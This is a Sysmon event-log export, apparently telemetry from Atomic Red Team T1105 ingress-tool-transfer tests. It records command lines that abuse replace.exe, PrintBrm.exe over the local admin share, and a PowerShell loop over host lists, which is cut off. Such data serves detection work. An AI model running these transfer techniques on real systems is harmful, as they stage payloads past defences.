Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c del %%TEMP%%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %%TEMP%% /A",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19649,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.845

ProcessGuid: {f57bd86a-8d5c-658c-0d02-000000000f00}

ProcessId: 9628

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c del %%TEMP%%\redcanary.cab >nul 2>&1 & C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %%TEMP%% /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d5c-658c-0d02-000000000f00},3588,9628,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:24.8489205Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:24.845,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:24.8489205Z""/>
      <EventRecordID>19649</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:24.845</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5c-658c-0d02-000000000f00}</Data>
      <Data Name=""ProcessId"">9628</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c del %%TEMP%%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %%TEMP%% /A</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.845

ProcessGuid: {f57bd86a-8d5c-658c-0d02-000000000f00}

ProcessId: 9628

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c del %%TEMP%%\redcanary.cab &gt;nul 2&gt;&amp;1 &amp; C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" %%TEMP%% /A

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\spool\tools\PrintBrmEngine.exe -Embedding,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,PrintBrmEngine EXE,1,19648,10.0.22621.1 (WinBuild.160101.0800),"MD5=6CCA25832D39BB34734439EAA7DBCE8E,SHA256=CD937EEB4EFAEB5B09D58B631BB4C7A8E1E3F6CEAB8BF94F332D17826FDA7563,IMPHASH=763E714CBFF49CE4160A414D8BA61297",C:\Windows\System32\spool\tools\PrintBrmEngine.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.540

ProcessGuid: {f57bd86a-8d5c-658c-0c02-000000000f00}

ProcessId: 10512

Image: C:\Windows\System32\spool\tools\PrintBrmEngine.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: PrintBrmEngine EXE

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PrintBrmEng.exe

CommandLine: C:\Windows\system32\spool\tools\PrintBrmEngine.exe -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=6CCA25832D39BB34734439EAA7DBCE8E,SHA256=CD937EEB4EFAEB5B09D58B631BB4C7A8E1E3F6CEAB8BF94F332D17826FDA7563,IMPHASH=763E714CBFF49CE4160A414D8BA61297

ParentProcessGuid: {f57bd86a-36f5-658c-0d00-000000000f00}

ParentProcessId: 932

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p

ParentUser: NT AUTHORITY\SYSTEM",Info,PrintBrmEng.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\svchost.exe,{f57bd86a-36f5-658c-0d00-000000000f00},932,NT AUTHORITY\SYSTEM,,{f57bd86a-8d5c-658c-0c02-000000000f00},3588,10512,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:24.5446715Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:24.540,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:24.5446715Z""/>
      <EventRecordID>19648</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:24.540</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5c-658c-0c02-000000000f00}</Data>
      <Data Name=""ProcessId"">10512</Data>
      <Data Name=""Image"">C:\Windows\System32\spool\tools\PrintBrmEngine.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">PrintBrmEngine EXE</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PrintBrmEng.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\spool\tools\PrintBrmEngine.exe -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=6CCA25832D39BB34734439EAA7DBCE8E,SHA256=CD937EEB4EFAEB5B09D58B631BB4C7A8E1E3F6CEAB8BF94F332D17826FDA7563,IMPHASH=763E714CBFF49CE4160A414D8BA61297</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f5-658c-0d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k DcomLaunch -p</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.540

ProcessGuid: {f57bd86a-8d5c-658c-0c02-000000000f00}

ProcessId: 10512

Image: C:\Windows\System32\spool\tools\PrintBrmEngine.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: PrintBrmEngine EXE

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PrintBrmEng.exe

CommandLine: C:\Windows\system32\spool\tools\PrintBrmEngine.exe -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=6CCA25832D39BB34734439EAA7DBCE8E,SHA256=CD937EEB4EFAEB5B09D58B631BB4C7A8E1E3F6CEAB8BF94F332D17826FDA7563,IMPHASH=763E714CBFF49CE4160A414D8BA61297

ParentProcessGuid: {f57bd86a-36f5-658c-0d00-000000000f00}

ParentProcessId: 932

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\spool\tools\PrintBrm.exe  -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f C:\Users\User\AppData\Local\Temp\PrintBrm.zip -O FORCE,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Print BRM command line tool,1,19647,10.0.22621.1 (WinBuild.160101.0800),"MD5=82C9D54E2B0782CB1B601A6899F04EF0,SHA256=C9994C6272D2B503D513BF1F98CEBEA9D9847D7286AFE079E288BEDAB36AB7E5,IMPHASH=335FB8BBF2AE039819821046E0DEAFCC",C:\Windows\System32\spool\tools\PrintBrm.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.515

ProcessGuid: {f57bd86a-8d5c-658c-0b02-000000000f00}

ProcessId: 4552

Image: C:\Windows\System32\spool\tools\PrintBrm.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Print BRM command line tool

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PrintBrm.exe

CommandLine: C:\Windows\System32\spool\tools\PrintBrm.exe  -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f C:\Users\User\AppData\Local\Temp\PrintBrm.zip -O FORCE

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=82C9D54E2B0782CB1B601A6899F04EF0,SHA256=C9994C6272D2B503D513BF1F98CEBEA9D9847D7286AFE079E288BEDAB36AB7E5,IMPHASH=335FB8BBF2AE039819821046E0DEAFCC

ParentProcessGuid: {f57bd86a-8d5c-658c-0902-000000000f00}

ParentProcessId: 2840

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c del %TEMP%\PrintBrm.zip >nul 2>&1  & C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %TEMP%\PrintBrm.zip -O FORCE

ParentUser: WINDEV2309EVAL\User",Info,PrintBrm.exe,"""cmd.exe"" /c del %TEMP%\PrintBrm.zip >nul 2>&1  & C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %TEMP%\PrintBrm.zip -O FORCE",C:\Windows\System32\cmd.exe,{f57bd86a-8d5c-658c-0902-000000000f00},2840,WINDEV2309EVAL\User,,{f57bd86a-8d5c-658c-0b02-000000000f00},3588,4552,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:24.5170419Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:24.515,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:24.5170419Z""/>
      <EventRecordID>19647</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:24.515</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5c-658c-0b02-000000000f00}</Data>
      <Data Name=""ProcessId"">4552</Data>
      <Data Name=""Image"">C:\Windows\System32\spool\tools\PrintBrm.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Print BRM command line tool</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PrintBrm.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\System32\spool\tools\PrintBrm.exe  -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f C:\Users\User\AppData\Local\Temp\PrintBrm.zip -O FORCE</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=82C9D54E2B0782CB1B601A6899F04EF0,SHA256=C9994C6272D2B503D513BF1F98CEBEA9D9847D7286AFE079E288BEDAB36AB7E5,IMPHASH=335FB8BBF2AE039819821046E0DEAFCC</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d5c-658c-0902-000000000f00}</Data>
      <Data Name=""ParentProcessId"">2840</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c del %TEMP%\PrintBrm.zip &gt;nul 2&gt;&amp;1  &amp; C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %TEMP%\PrintBrm.zip -O FORCE</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.515

ProcessGuid: {f57bd86a-8d5c-658c-0b02-000000000f00}

ProcessId: 4552

Image: C:\Windows\System32\spool\tools\PrintBrm.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Print BRM command line tool

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PrintBrm.exe

CommandLine: C:\Windows\System32\spool\tools\PrintBrm.exe  -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f C:\Users\User\AppData\Local\Temp\PrintBrm.zip -O FORCE

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=82C9D54E2B0782CB1B601A6899F04EF0,SHA256=C9994C6272D2B503D513BF1F98CEBEA9D9847D7286AFE079E288BEDAB36AB7E5,IMPHASH=335FB8BBF2AE039819821046E0DEAFCC

ParentProcessGuid: {f57bd86a-8d5c-658c-0902-000000000f00}

ParentProcessId: 2840

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c del %TEMP%\PrintBrm.zip &gt;nul 2&gt;&amp;1  &amp; C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %TEMP%\PrintBrm.zip -O FORCE

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c del %%TEMP%%\PrintBrm.zip >nul 2>&1  & C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %%TEMP%%\PrintBrm.zip -O FORCE",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19646,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.485

ProcessGuid: {f57bd86a-8d5c-658c-0902-000000000f00}

ProcessId: 2840

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c del %%TEMP%%\PrintBrm.zip >nul 2>&1  & C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %%TEMP%%\PrintBrm.zip -O FORCE

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d5c-658c-0902-000000000f00},3588,2840,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:24.4865167Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:24.485,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:24.4865167Z""/>
      <EventRecordID>19646</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:24.485</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5c-658c-0902-000000000f00}</Data>
      <Data Name=""ProcessId"">2840</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c del %%TEMP%%\PrintBrm.zip &gt;nul 2&gt;&amp;1  &amp; C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %%TEMP%%\PrintBrm.zip -O FORCE</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:24.485

ProcessGuid: {f57bd86a-8d5c-658c-0902-000000000f00}

ProcessId: 2840

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c del %%TEMP%%\PrintBrm.zip &gt;nul 2&gt;&amp;1  &amp; C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %%TEMP%%\PrintBrm.zip -O FORCE

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:47:22.831,,,11,19645,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:47:22.831

ProcessGuid: {f57bd86a-8d5a-658c-0702-000000000f00}

ProcessId: 6664

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gup5zmhj.5hg.ps1

CreationUtcTime: 2023-12-27 20:47:22.831

User: WINDEV2309EVAL\User",Info,,,,,,,,{f57bd86a-8d5a-658c-0702-000000000f00},3588,6664,,,,,"
      ",-,2023-12-27T20:47:22.8404058Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gup5zmhj.5hg.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:22.831,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:22.8404058Z""/>
      <EventRecordID>19645</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:22.831</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5a-658c-0702-000000000f00}</Data>
      <Data Name=""ProcessId"">6664</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gup5zmhj.5hg.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:47:22.831</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:47:22.831

ProcessGuid: {f57bd86a-8d5a-658c-0702-000000000f00}

ProcessId: 6664

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_gup5zmhj.5hg.ps1

CreationUtcTime: 2023-12-27 20:47:22.831

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$machine_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt\""""
$offline_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105OfflineHosts.txt\""""
$completed_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt\""""
foreach ($machine in get-content -path \""""$machine_list\"""")
